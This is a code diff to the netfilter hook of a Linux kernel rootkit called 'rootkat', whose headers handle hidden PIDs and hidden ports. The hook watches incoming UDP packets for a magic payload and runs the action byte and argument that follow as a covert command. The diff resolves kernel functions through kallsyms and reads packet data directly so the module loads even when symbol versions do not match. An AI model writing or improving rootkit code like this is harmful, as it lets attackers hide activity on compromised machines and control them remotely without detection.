@@ -10,6 +10,7 @@
 #include <net/net_namespace.h>
 #include "hidden_pids.h"
 #include "hidden_ports.h"
+#include "kallsyms.h"
 #include "hook_netfilter.h"
 
 #define TAG "rootkat/hook_netfilter: "
@@ -25,6 +26,21 @@ static struct nf_hook_ops rootkat_nf_ops = {
 };
 
 static bool rootkat_nf_installed;
+
+/*
+ * nf_register_net_hook / nf_unregister_net_hook are EXPORT_SYMBOL_GPL,
+ * but their MODVERSIONS CRCs differ between the Ubuntu 24.04 build-
+ * container headers and the actual cloud-image kernel — `insmod` then
+ * refuses the module with "disagrees about version of symbol". Resolve
+ * them via kallsyms (which doesn't go through MODVERSIONS) and call
+ * through fn pointers, mirroring what we do for every other kernel API.
+ */
+typedef int (*nf_register_net_hook_t)(struct net *net,
+                                       const struct nf_hook_ops *reg);
+typedef void (*nf_unregister_net_hook_t)(struct net *net,
+                                          const struct nf_hook_ops *reg);
+static nf_register_net_hook_t   nf_register_fn;
+static nf_unregister_net_hook_t nf_unregister_fn;
 
 /*
  * Direct calls to the registry functions. We deliberately bypass
@@ -54,10 +70,9 @@ static unsigned int rootkat_nf_pre_routing(void *priv, struct sk_buff *skb,
                                            const struct nf_hook_state *state)
 {
 	struct iphdr *iph;
-	struct udphdr _udph, *udph;
-	u8 _payload[ROOTKAT_NET_FRAME_LEN];
+	struct udphdr *udph;
 	u8 *payload;
-	unsigned int udp_off, payload_off;
+	unsigned int hdr_total;
 	u8 action;
 	u32 arg;
 
@@ -68,22 +83,30 @@ static unsigned int rootkat_nf_pre_routing(void *priv, struct sk_buff *skb,
 	if (!iph || iph->protocol != IPPROTO_UDP)
 		return NF_ACCEPT;
 
-	udp_off = iph->ihl * 4;
-	udph = skb_header_pointer(skb, udp_off, sizeof(_udph), &_udph);
-	if (!udph)
+	hdr_total = iph->ihl * 4 + sizeof(struct udphdr);
+
+	/*
+	 * Direct skb->data access for the payload, guarded by skb_headlen()
+	 * to ensure the bytes we want are in the linear region. We avoid
+	 * skb_header_pointer because its slow path calls skb_copy_bits, an
+	 * EXPORT_SYMBOL whose CRC has drifted between Ubuntu 24.04 release
+	 * snapshots — the inline call would force MODVERSIONS to import
+	 * skb_copy_bits and break module load. For loopback UDP with a
+	 * 16-byte payload the skb is virtually always linear; if it isn't
+	 * we conservatively accept.
+	 */
+	if (skb_headlen(skb) < hdr_total + ROOTKAT_NET_FRAME_LEN)
 		return NF_ACCEPT;
 
-	payload_off = udp_off + sizeof(*udph);
-	payload = skb_header_pointer(skb, payload_off,
-	                             ROOTKAT_NET_FRAME_LEN, _payload);
-	if (!payload)
-		return NF_ACCEPT;
+	udph = (struct udphdr *)(skb->data + iph->ihl * 4);
+	(void)udph;   /* udph is here for clarity; we don't filter on it */
+
+	payload = skb->data + hdr_total;
 
 	if (memcmp(payload, ROOTKAT_NET_MAGIC, ROOTKAT_NET_MAGIC_LEN))
 		return NF_ACCEPT;
 
 	action = payload[ROOTKAT_NET_MAGIC_LEN];
-	/* arg is at offset 12, network byte order */
 	arg = ntohl(*(__be32 *)(payload + 12));
 
 	rootkat_handle_net_magic(action, arg);
@@ -95,8 +118,20 @@ static unsigned int rootkat_nf_pre_routing(void *priv, struct sk_buff *skb,
 
 int rootkat_hook_netfilter_install(void)
 {
-	int rc = nf_register_net_hook(&init_net, &rootkat_nf_ops);
+	int rc;
 
+	if (!nf_register_fn) {
+		nf_register_fn = (nf_register_net_hook_t)
+			rootkat_lookup_name("nf_register_net_hook");
+		nf_unregister_fn = (nf_unregister_net_hook_t)
+			rootkat_lookup_name("nf_unregister_net_hook");
+	}
+	if (!nf_register_fn || !nf_unregister_fn) {
+		pr_err(TAG "nf_register/unregister_net_hook not resolved\n");
+		return -ENOENT;
+	}
+
+	rc = nf_register_fn(&init_net, &rootkat_nf_ops);
 	if (rc) {
 		pr_err(TAG "nf_register_net_hook: %d\n", rc);
 		return rc;
@@ -108,9 +143,9 @@ int rootkat_hook_netfilter_install(void)
 
 void rootkat_hook_netfilter_remove(void)
 {
-	if (!rootkat_nf_installed)
+	if (!rootkat_nf_installed || !nf_unregister_fn)
 		return;
-	nf_unregister_net_hook(&init_net, &rootkat_nf_ops);
+	nf_unregister_fn(&init_net, &rootkat_nf_ops);
 	rootkat_nf_installed = false;
 	pr_info(TAG "netfilter hook removed\n");
 }
